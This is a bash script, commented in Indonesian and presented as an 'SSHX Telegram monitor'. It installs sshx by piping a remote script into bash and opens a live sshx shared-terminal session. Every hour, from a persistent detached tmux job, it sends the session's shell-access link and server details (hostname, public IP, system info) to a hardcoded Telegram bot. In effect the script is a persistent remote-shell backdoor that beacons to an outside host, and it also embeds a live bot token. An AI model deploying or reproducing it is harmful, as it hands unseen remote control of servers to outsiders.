#!/bin/bash
# ============================================
# SSHX TELEGRAM MONITOR - FINAL FULL
# ============================================

set -e

# ==============================
# Warna output
# ==============================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# ==============================
# Konfigurasi Telegram
# ==============================
BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"

send_telegram(){
  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
       -d "chat_id=$CHAT_ID" \
       -d "text=$1" \
       -d "parse_mode=HTML" > /dev/null
}

# ==============================
# Logging
# ==============================
log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_step() { echo -e "${BLUE}[STEP]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }

# ==============================
# Deteksi OS & package manager
# ==============================
detect_os(){
  log_step "Mendeteksi sistem operasi..."
  if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
  fi

  case $OS in
    ubuntu|debian)
      PKG_MANAGER="apt-get"
      INSTALL_CMD="apt-get install -y"
      ;;
    centos|rhel|fedora|almalinux)
      PKG_MANAGER="yum"
      INSTALL_CMD="yum install -y"
      [ -f /etc/fedora-release ] && PKG_MANAGER="dnf" && INSTALL_CMD="dnf install -y"
      ;;
    alpine)
      PKG_MANAGER="apk"
      INSTALL_CMD="apk add"
      ;;
    arch)
      PKG_MANAGER="pacman"
      INSTALL_CMD="pacman -S --noconfirm"
      ;;
    *)
      PKG_MANAGER="apt-get"
      INSTALL_CMD="apt-get install -y"
      ;;
  esac
  log_info "OS: $OS, Package Manager: $PKG_MANAGER"
}

# ==============================
# Install dependencies
# ==============================
install_dependencies(){
  log_step "Menginstall dependencies..."
  if [ "$PKG_MANAGER" = "apt-get" ]; then apt-get update -y; fi
  command -v curl >/dev/null || $INSTALL_CMD curl
  command -v tmux >/dev/null || $INSTALL_CMD tmux
  if ! command -v sshx >/dev/null; then
    log_info "Install sshx..."
    curl -fsSL https://sshx.io/get | bash
  fi
  export PATH=$PATH:$HOME/.sshx/bin
  log_info "Dependencies selesai"
}

# ==============================
# Ambil info server
# ==============================
get_server_info(){
  HOST=$(hostname)
  IP=$(curl -s ifconfig.me)
  UNAME=$(uname -a)
  UPTIME=$(uptime)
  CPU=$(top -bn1 | grep "Cpu(s)")
  RAM=$(free -h | grep Mem)
  DISK=$(df -h / | tail -1)

  echo "<b>Hostname:</b> $HOST
<b>IP:</b> $IP

<b>System:</b>
<code>$UNAME</code>

<b>Uptime:</b> <code>$UPTIME</code>

<b>CPU:</b> <code>$CPU</code>

<b>RAM:</b> <code>$RAM</code>

<b>Disk:</b> <code>$DISK</code>"
}

# ==============================
# Jalankan SSHX & ambil output + link
# ==============================
run_sshx(){
  ATTEMPTS=0
  while [ $ATTEMPTS -lt 5 ]; do
    OUTPUT=$(timeout 20 sshx --quiet 2>&1 || true)
    LINK=$(echo "$OUTPUT" | grep -o 'https://sshx.io/s/[^ ]*' | head -1)
    if [ -n "$LINK" ]; then
      echo "$OUTPUT|$LINK"
      return
    fi
    ATTEMPTS=$((ATTEMPTS+1))
    sleep 5
  done
  echo "$OUTPUT|TIDAK_ADA_LINK"
}

# ==============================
# Kirim laporan SSHX + info server
# ==============================
send_report(){
  SERVER_INFO=$(get_server_info)
  SSHX_DATA=$(run_sshx)
  SSHX_OUTPUT=$(echo "$SSHX_DATA" | cut -d'|' -f1)
  SSHX_LINK=$(echo "$SSHX_DATA" | cut -d'|' -f2)

  MSG="🔥 <b>SSHX REPORT</b>

$SERVER_INFO

━━━━━━━━━━━━━━

📟 SSHX Output:
<code>$SSHX_OUTPUT</code>

🔗 SSHX Link:
<code>$SSHX_LINK</code>"

  send_telegram "$MSG"
}

# ==============================
# Buat script monitor untuk tmux
# ==============================
create_monitor_script(){
  log_step "Membuat script monitor /usr/local/bin/sshx-monitor.sh"
  cat > /usr/local/bin/sshx-monitor.sh << 'EOF'
#!/bin/bash
BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"

send_telegram(){
  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
       -d "chat_id=$CHAT_ID" \
       -d "text=$1" \
       -d "parse_mode=HTML" > /dev/null
}

get_server_info(){
  HOST=$(hostname)
  IP=$(curl -s ifconfig.me)
  UNAME=$(uname -a)
  UPTIME=$(uptime)
  CPU=$(top -bn1 | grep "Cpu(s)")
  RAM=$(free -h | grep Mem)
  DISK=$(df -h / | tail -1)

  echo "<b>Hostname:</b> $HOST
<b>IP:</b> $IP
<b>System:</b>
<code>$UNAME</code>
<b>Uptime:</b>
<code>$UPTIME</code>
<b>CPU:</b>
<code>$CPU</code>
<b>RAM:</b>
<code>$RAM</code>
<b>Disk:</b>
<code>$DISK</code>"
}

run_sshx(){
  ATTEMPTS=0
  while [ $ATTEMPTS -lt 5 ]; do
    OUTPUT=$(timeout 20 sshx --quiet 2>&1 || true)
    LINK=$(echo "$OUTPUT" | grep -o 'https://sshx.io/s/[^ ]*' | head -1)
    if [ -n "$LINK" ]; then
      echo "$OUTPUT|$LINK"
      return
    fi
    ATTEMPTS=$((ATTEMPTS+1))
    sleep 5
  done
  echo "$OUTPUT|TIDAK_ADA_LINK"
}

send_report(){
  SERVER_INFO=$(get_server_info)
  SSHX_DATA=$(run_sshx)
  SSHX_OUTPUT=$(echo "$SSHX_DATA" | cut -d'|' -f1)
  SSHX_LINK=$(echo "$SSHX_DATA" | cut -d'|' -f2)

  MSG="🔥 <b>SSHX REPORT</b>

$SERVER_INFO

━━━━━━━━━━━━━━

📟 SSHX Output:
<code>$SSHX_OUTPUT</code>

🔗 SSHX Link:
<code>$SSHX_LINK</code>"

  send_telegram "$MSG"
}

# Kirim laporan pertama segera
send_report

# Loop setiap 1 jam
while true; do
  sleep 3600
  send_report
done
EOF
  chmod +x /usr/local/bin/sshx-monitor.sh
}

# ==============================
# Jalankan monitor di tmux
# ==============================
setup_tmux(){
  log_step "Menjalankan monitor di tmux..."
  tmux kill-session -t sshx-monitor 2>/dev/null || true
  tmux new-session -d -s sshx-monitor "bash /usr/local/bin/sshx-monitor.sh"
}

# ==============================
# MAIN
# ==============================
main(){
  clear
  detect_os
  install_dependencies
  create_monitor_script
  setup_tmux
  log_info "✅ SSHX Monitor berjalan di tmux"
  log_info "📌 Cek dengan: tmux attach -t sshx-monitor"

  # Kirim laporan pertama lengkap ke Telegram
  send_report
}

main
